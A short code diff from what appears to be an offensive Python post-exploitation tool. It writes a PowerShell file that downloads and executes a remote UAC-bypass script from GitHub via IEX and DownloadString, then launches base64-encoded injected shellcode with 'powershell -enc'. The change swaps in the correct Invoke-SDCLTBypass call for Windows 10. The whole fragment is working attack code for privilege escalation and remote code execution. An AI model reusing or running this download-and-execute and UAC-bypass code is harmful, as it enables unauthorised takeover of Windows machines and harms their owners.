@@ -29,7 +29,7 @@ class EXTRAS(object):
             uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://github.com/PowerShellEmpire/Empire/raw/master/data/module_source/privesc/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
             base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
         elif version == "10":
-            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-SDCLTBypass.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
+            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-SDCLTBypass.ps1");\nInvoke-SDCLTBypass -Command \"powershell -enc %s\" """ % (
             base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
         with open('bypassuac.ps1', 'w') as uacbypassfile:
             uacbypassfile.write(uacbypassfilecontent)
